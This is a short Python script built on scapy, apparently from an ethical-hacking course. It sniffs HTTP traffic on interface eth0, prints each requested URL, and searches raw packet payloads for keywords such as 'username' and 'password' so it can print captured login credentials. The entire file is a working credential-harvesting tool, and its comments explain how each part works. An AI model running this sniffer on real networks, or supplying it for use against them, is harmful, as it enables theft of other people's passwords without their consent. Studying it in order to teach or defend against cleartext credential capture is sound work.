#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    # store instructs not to store captured data in memory
    # prn is a callback function to call each time a packet is captured
    # filter traffic based on protocols or ports - "arp" or "port 80"
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    # Now check if packet has a Raw layer (which contains user names & passwords)
    if packet.haslayer(scapy.Raw):
        # print(packet.show())
        # print raw layer, load field
        # print(packet[scapy.Raw].load)
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass", "nid"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    # check if captured packet has data sent over HTTP or any other layer, TCP etc.
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))
        # You can also convert a byte object into a string as
        # print("[+] HTTP Request >> " + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff("eth0")
